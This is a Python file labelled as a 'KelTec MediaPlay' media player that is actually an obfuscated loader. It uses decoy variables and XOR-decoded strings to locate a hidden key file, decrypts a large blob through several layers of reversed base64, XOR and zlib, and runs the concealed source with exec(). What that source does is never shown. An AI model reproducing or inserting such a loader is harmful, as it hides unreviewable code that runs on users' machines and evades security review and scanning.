# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 189188 ^ 907235
_lx1_1 = len("fc0135")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-963558)
_lx3_3 = 646321 * 0
_lx4_4 = 321508 ^ 220495
_M = 'hc2tGHiBaDK+k4gco3+PuVRVdeFUlVNyxeY9oE7D3RnYkKBbIYMpOOKWgxakfojtAgYm4wLEUiOV4zPzEMfYHNLGp15w0HNvvJKG'
_D = '=gN0o7npvlgRq0rgTrSUwos+rzJkSYiRv2KNKqyxtwHR/vgSDPYN4AaXJyroR+ElWfmb84Q1BTiDinKMkz/G8sKdGg5X7nWL2vylecBeWzIxtmQVtyOhq6LrCJJhVzXui9W1aJsK5Uk+JmTL4IL+K1X1s2tXjfQUj0QO1OcXdotqKFQqrsPwFOQzAlbZ/x6Mauw+niCT2w/O72QHXhy2aKCWTpTUTxOZbPIAAMISrfe5K2kT8+3scm9SmWfhTE/0RHFOvykYMeYHeuvZJFI6vkLLwubgAk8d9ihFijxi8WKmKZBO3QRJ5xxIippWbgRGNWJS8h7WTKTKJnayYqq/rK4JrFRsGFFh/ZAzBqdp8YO6XG8LJxiKXx8UmlawYr3UXCVh40rSpZiJWIgvQ5LYgq2a/6rfUCDbNvjUj80qK9FO+ZfJQoYu+OSJMtNDb5PVjlP2KKYiCirjah2Yg6/lq5Cq3wmryHcAAI8p2/NevNrDV7+c7nJWF51n8NtwoUe6FCKbm7zzPShwJgLIvCBjrVYImZO3L0Xu3AP++luV2zhDbarc7EIFqX/7dTCnCpPxqD4EIJX4zrdkAJQ7tLd9QEmYZHJ2b6iGZmYCVFFRoyetBNwDwGgfKKBd/Iju/jtVTOdaSo9wjb8di2lvimQySfebjck+wVAda51cMXKZrjYujCQuG4FORB0w9BM5OPkBGqQvf/EtPHsYlzWMzyDYrXmRKAYqec2ZXZOl8qScrP/h+Jp6x8sgWZjElYzgdpyfBtQe9w2AdvjByYQcxBYn8JZlJ7xLa+7kUI9gQyDSG5bDMXo5e74RznDxanQdqf1VF43wh2RJ4UcvpKDQOyG6tByiUADO8b4PmassAhz43BZslSjQoW1A1noCy5JSz0Q1+mNFIaXstVEWO7qdHmE6/d2d1wb5k/CfI1q7mmF3+Fu7bSnAZccikd1Xm9OuvuKztFnTfDiUZVJ2wMXnymNYbvfQXo/UsS7ytodH/9bRxqhP88FggPST0McKMe5LxEqRd/uEyzl15tTDiYc2woJhA5UjOoy+EhVD7tezuJY0NESUyOSFlu/KTEXqa5+kujiKehSORl02yTjovPAcc43agLXzmIWlFAjgxnpBfKpTEr/ZxR6dcPtE+7eY7SFOUQCbRtnnpfAo8XWzUndBpgxWxBA1JItWcV9baS7GHzQxo19QS9DGxkXPc80lKymbjMrWfE75yk/CGprRlvWK3+xQ0+Km2JaMCBRK1k4+d1mTZet9lKpnuMTj1Vl5rK86vHnmOlo3rXT3S6KNXqLQ9cKz2bHVds7LvnQiAwIDuSgJRQiM4CXd8kFvQ6bse3r3ROdaYMAhVCznLx76+EoIH/adu26rVK5OMEdOZUMz8THCdiKjqMjd4QYMc4woWlpt+u716DJ2A7s1GlqYxHZLKcF8L/TroNTSh6YLFBOQDL9dqIV3Btyy/NiqRdOrpx5E69YNmuXZmI94loOdmfc1xfgH8hauvgHQM8BAjjovyrxN1R2jO7bX6thSJ8sshK6QX3KWf5q2BrhYn5EfLqt4pnjttCFuNvJrGhZQ7bsNnU9W9P0QYVOe2iLUVm12LYI3IuRgOnl6KBc6N0X9YOfydZBObIeCg1yy4cDMp1cKICE58mVdNG7AlTL0AaYpq8fWTN4If1Ds'

_b19f=[75,98,11,75,16,59,206,192]+[228,7,249,114,238,9,192,113]
_f872=[158,72,177,71,143,103,55,160]+[172,208,71,236,245,70,166,201]
_37da=bytes([a^b for a,b in zip([57,7,120,36,101,73,173,165,151,40,157,19,154,104],_b19f*8)]).decode()
_f30a=bytes([a^b for a,b in zip([253,41,210,47,234,73,83,193,216],_f872*8)]).decode()
_d7d2=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_37da.split('/'),_f30a)
with open(_d7d2,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})